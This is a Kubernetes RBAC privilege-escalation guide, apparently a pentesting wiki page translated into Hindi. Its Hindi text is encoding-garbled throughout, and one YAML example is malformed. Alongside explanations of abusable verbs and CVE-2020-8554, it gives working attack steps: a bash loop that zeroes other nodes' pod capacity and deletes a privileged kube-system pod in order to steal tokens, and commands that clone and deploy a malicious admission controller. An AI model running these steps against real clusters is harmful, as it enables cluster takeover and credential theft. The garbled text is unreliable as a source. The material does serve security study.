**GCP рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ** рд╣реИрдВред рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рднреА рдЕрдиреБрдорддрд┐ **`container.clusters.get`** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рддрд╛рдХрд┐ рд╡рд╣ рдХреНрд▓рд╕реНрдЯрд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЗрдХрдЯреНрдард╛ рдХрд░ рд╕рдХреЗ, рдпрд╛ рддреЛ рдЖрдкрдХреЛ **рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ kubectl рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛** (рдЕрдЧрд▓реЗ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ)ред

{% hint style="warning" %}
K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдмрд╛рдд рдХрд░рддреЗ рд╕рдордп, **GCP рдСрде рдЯреЛрдХрди рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдлрд┐рд░, GCP, K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рд▓реЗ **рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** (рдИрдореЗрд▓ рджреНрд╡рд╛рд░рд╛) **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рдПрдХреНрд╕реЗрд╕ рд╣реИ рдпрд╛ рдирд╣реАрдВ**, рдлрд┐рд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдпрд╣ **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдИ рдПрдХреНрд╕реЗрд╕ рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред\
рдпрджрд┐ рдЗрдирдореЗрдВ рд╕реЗ **рдХреЛрдИ рднреА рд╕рдЪ рд╣реИ**, рддреЛ рдЙрд╕реЗ **рдЬрд╡рд╛рдм рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдпрджрд┐ **рдирд╣реАрдВ**, рддреЛ рдПрдХ **рддреНрд░реБрдЯрд┐** рджреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдореЗрдВ **GCP IAM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреА рд╕реБрдЭрд╛рд╡ рджреА рдЬрд╛рдПрдЧреА**ред
{% endhint %}

рдлрд┐рд░, рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ **GCP IAM** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, K8s рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдкрд╛рд╕ рдЙрдирдХреА **рд╕рдордХрдХреНрд╖ GCP IAM рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рдкрд╛рд╕ рдпрд╣ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреАред

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ рд╣реИ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ K8s рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдирд╛** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕рдХреЗ **рдИрдореЗрд▓** (GCP рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╢рд╛рдорд┐рд▓) рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдПред

### рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдЯреЛрдХрди рдмрдирд╛рдПрдВ

рдЬреЛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ **TokenRequests рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`serviceaccounts/token`) K8s рдПрдкреАрдЖрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдмрд╛рдд рдХрд░рддреЗ рд╕рдордп SAs (рдпрд╣рд╛рдБ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego))ред

### ephemeralcontainers

рдЬреЛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ **`pods/ephemeralcontainers`** рдкрд░ **`update`** рдпрд╛ **`patch`** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ **рдЕрдиреНрдп рдкреЙрдбреНрд╕ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдирдХреЗ рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдЬреЛрдбрд╝рдХрд░ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдХрдВрдЯреЗрдирд░ рдЬреЛрдбрд╝рдХрд░ред

### ValidatingWebhookConfigurations рдпрд╛ MutatingWebhookConfigurations

рдЬрд┐рди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЗ рдкрд╛рд╕ `validatingwebhookconfigurations` рдпрд╛ `mutatingwebhookconfigurations` рдкрд░ `create`, `update` рдпрд╛ `patch` рд╡рд░реНрдм рд╣реИ, рд╡реЗ **рдПрдХ рдРрд╕рд╛ webhookconfigurations рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рд╕реЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдПрдХ [`mutatingwebhookconfigurations` рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдЗрд╕ рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](./#malicious-admission-controller)ред

### рдЙрдиреНрдирддрд┐

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдЕрдЧрд▓реЗ рдЦрдВрдб рдореЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ: [**рдЕрдВрджрд░ рдирд┐рд░реНрдорд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдирд┐рд╡рд╛рд░рдг**](./#built-in-privileged-escalation-prevention), рдПрдХ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗрд╡рд▓ рдЙрд╕ рдирдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рди рддреЛ рд░реЛрд▓ рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░ рд░реЛрд▓ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рди рд╣реА рдЙрдиреНрд╣реЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╡рд╣ рдирдИ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВред рдХреЗрд╡рд▓ рдЕрдЧрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ **`escalate` рд╡рд░реНрдм** рд╣реИ **`roles`** рдпрд╛ **`clusterroles`** рдкрд░ред\
рдлрд┐рд░ рд╡рд╣ рдирдП рд░реЛрд▓, рдХреНрд▓рд╕реНрдЯрд░ рд░реЛрд▓ рдЕрдкрдбреЗрдЯ/рдирдП рд░реЛрд▓, рдХреНрд▓рд╕реНрдЯрд░ рд░реЛрд▓ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╕реЗ рдмреЗрд╣рддрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВред

### рдиреЛрдбреНрд╕ рдкреНрд░реЙрдХреНрд╕реА

**`nodes/proxy`** рдЙрдкрд╕реНрд░реЛрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреНрдпрд╛ **рдкреЙрдбреНрд╕ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреВрдмрд▓реЗрдЯ рдПрдкреАрдЖрдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдХреЗ рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣рд╛рдБ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego))ред рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдХреНрдпреВрдмрд▓реЗрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

рдЖрдкрдХреЛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдорд┐рд▓рддрд╛ рд╣реИ рдХрд┐ [**рдПрдХ Kubelet рдПрдкреАрдЖрдИ рд╕реЗ рдЕрдзрд┐рдХреГрдд рдмреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╣рд╛рдБ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА**](../pentesting-kubernetes-services/#kubelet-rce)ред

### рдкреЙрдбреНрд╕ рд╣рдЯрд╛рдПрдВ + рдЕрдирд╕реНрдХреЗрдЬреБрд▓реЗрдмрд▓ рдиреЛрдбреНрд╕

рдЬреЛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ **рдкреЙрдбреНрд╕ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`pods` рд╕рдВрд╕рд╛рдзрди рдкрд░ `delete` рд╡рд░реНрдм), рдпрд╛ **рдкреЙрдбреНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** (`pods/eviction` рд╕рдВрд╕рд╛рдзрди рдкрд░ `create` рд╡рд░реНрдм), рдпрд╛ **рдкреЙрдб рд╕реНрдерд┐рддрд┐ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ** (`pods/status` рддрдХ рдкрд╣реБрдВрдЪ) рдФрд░ **рдЕрдирд╕реНрдХреЗрдЬреБрд▓реЗрдмрд▓ рдиреЛрдбреНрд╕** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (`nodes/status` рддрдХ рдкрд╣реБрдВрдЪ) рдпрд╛ **рдиреЛрдбреНрд╕ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** (`nodes` рд╕рдВрд╕рд╛рдзрди рдкрд░ `delete` рд╡рд░реНрдм) рдФрд░ рдПрдХ рдкреЙрдб рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛ, рд╡реЗ **рдЕрдиреНрдп рдиреЛрдбреНрд╕ рд╕реЗ рдкреЙрдбреНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рд╡реЗ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рдиреЛрдб** рдореЗрдВ **рдЪрд▓рд╛рдП** рдЬрд╛ рд╕рдХреЗрдВ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдкреЙрдбреНрд╕ рд╕реЗ **рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реНрдерд┐рддрд┐ (CVE-2020-8554)

рд╡реЗ рдореБрдЦреНрдп рд╕рд┐рджреНрдзрд╛рдВрдд рдЬреЛ **`services/status`** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ `status.loadBalancer.ingress.ip` рдлрд╝реАрд▓реНрдб рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЕрд╕реБрдзрд╛рд░рд┐рдд CVE-2020-8554** рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдВ рдФрд░ **MiTM рд╣рдорд▓реЗ рдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╢реБрд░реВ** рдХрд░ рд╕рдХреЗрдВред CVE-2020-8554 рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕реБрд░рдХреНрд╖рд╛ рдХрджрдо рдХреЗрд╡рд▓ рдмрд╛рд╣реНрдп рдЖрдИрдкреА рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ (рдХреЗ рдЕрдиреБрд╕рд╛рд░ [**рдпрд╣**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego))ред

### рдиреЛрдбреНрд╕ рдФрд░ рдкреЙрдбреНрд╕ рдХреА рд╕реНрдерд┐рддрд┐

**`nodes/status`** рдпрд╛ **`pods/status`** рдкрд░ **`update`** рдпрд╛ **`patch`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдореБрдЦреНрдп рд╕рд┐рджреНрдзрд╛рдВрдд, рд▓реЗрдмрд▓реЛрдВ рдХреЛ рд╕рдВрдЪрд╛рд▓рди рдирд┐рдпрдореЛрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдирд┐рд░реНрдорд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд░реЛрдХрдерд╛рдо

рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ [рдирд┐рд░реНрдорд┐рдд рддрдВрддреНрд░](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) рд╣реИ рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред

рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЙрдиреНрдирддрд┐ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**ред рдЗрд╕ рдирд┐рдпрдо рдХрд╛ рдкрд╛рд▓рди API рд╕реНрддрд░ рдкрд░ рд╣реЛрддрд╛ рд╣реИ, RBAC рдЕрдереЙрд░рд╛рдЗрдЬрд╝рд░ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛрдиреЗ рдкрд░ рднреА рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдирд┐рдпрдо рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рддрдм рдПрдХ рднреВрдорд┐рдХрд╛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЙрд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╕рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдореМрдЬреВрджрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╡рд╣ рдмрдирд╛рдиреЗ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ: рдпрд╛ рддреЛ рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА ClusterRoles рдХреЗ рд▓рд┐рдП рдпрд╛ рдирд╛рдорд╕реНрдерд╛рди (рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░-рд╡реНрдпрд╛рдкреА) рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рдирд╛рдордХрд░рдг рдореЗрдВ рд╕реАрдорд┐рддред

{% hint style="warning" %}
рдкрд┐рдЫрд▓реЗ рдирд┐рдпрдо рдХрд╛ рдПрдХ рдЕрдкрд╡рд╛рдж рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рдореБрдЦреНрдп рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЗ рдкрд╛рд╕ **рдХреНрд░рд┐рдпрд╛ `escalate`** рд╣реИ рдЙрд╕рдХреЗ рдУрд╡рд░ **`roles`** рдпрд╛ **`clusterroles`** рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдмрд┐рдирд╛ рднреА рднреВрдорд┐рдХрд╛рдУрдВ рдФрд░ рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдУрдВ рдХреА рдЙрдиреНрдирддрд┐ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### **RoleBindings/ClusterRoleBindings рдкреНрд░рд╛рдкреНрдд рдФрд░ рдкреИрдЪ рдХрд░реЗрдВ**

{% hint style="danger" %}
**рд╢рд╛рдпрдж рдпрд╣ рддрдХрдиреАрдХ рдкрд╣рд▓реЗ рдХрд╛рдо рдХрд░рддреА рдереА, рд▓реЗрдХрд┐рди рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд╛рд░рдг рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рдХреЛрдИ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдЖрдк рдЦреБрдж рдХреЛ рдпрд╛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рдХреБрдЫ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдПрдХ рднреВрдорд┐рдХрд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред**
{% endhint %}

Rolebindings рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдкреНрд░рднрд╛рд╡рд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рдПрдбрдорд┐рди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред**

## рдЕрдиреНрдп рд╣рдорд▓реЗ

### рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреЙрдбреНрд╕ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдХреЛрдИ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдирд╣реАрдВ рд╣реИред рд╕рд╛рдордВрдЬрд╕реНрдпрдкреВрд░реНрдг рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рджреЛ-рддрд░рдлрд╛, рдкреЙрдб рд╕реЗ рдкреЙрдб рддрдХред

#### рдПрдХ рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк рдмрдирд╛рдПрдВ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

рдЕрдкрдирд╛ .yaml рдмрдирд╛рдПрдВ
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
рдЕрдкрдиреЗ .yaml рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬрд╛рдПрдВ рдФрд░ рдЕрдирдХрдореЗрдВрдЯ рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
рд╡рд┐рдЪрд╛рд░рдХ рдХреА рд▓реЙрдЧ рджреЗрдЦреЗрдВ:
```bash
kubectl logs app -C proxy
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд░: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░рд╡реЗрд╢ рдирд┐рдпрдВрддреНрд░рдХ

рдПрдХ рдкреНрд░рд╡реЗрд╢ рдирд┐рдпрдВрддреНрд░рдХ **рдХреБрдмрд░рдиреЗрдЯреАрдЬ API рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ** рдЬрдм рд╡рд╕реНрддреБ рдХреЛ рд╕реНрдерд╛рдпреА рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рдЕрдиреБрд░реЛрдз рдкреНрд░рдорд╛рдгрд┐рдд** **рдФрд░ рдЕрдзрд┐рдХреГрдд** рд╣реЛрдиреЗ рдХреЗ рдмрд╛рджред

рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ **рдПрдХ рдореНрдпреБрдЯреЗрд╢рди рдПрдбрдорд┐рд╢рди рдирд┐рдпрдВрддреНрд░рдХ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдореЗрдВ рдХрд╛рдордпрд╛рдм рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ **рдкрд╣рд▓реЗ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред рдкреНрд░рд╛рдп: рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ, рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рддрд░рд╣ рд╕реЗ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╕реНрдерд╛рдпреА рд░рд╣рдиреЗ рдХреАред

**рдЙрджрд╛рд╣рд░рдг** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕реНрдерд┐рддрд┐ рддреИрдпрд╛рд░ рд╣реИ:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреЙрдб рдбрд┐рдкреНрд▓реЙрдп рдХрд░реЗрдВ:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
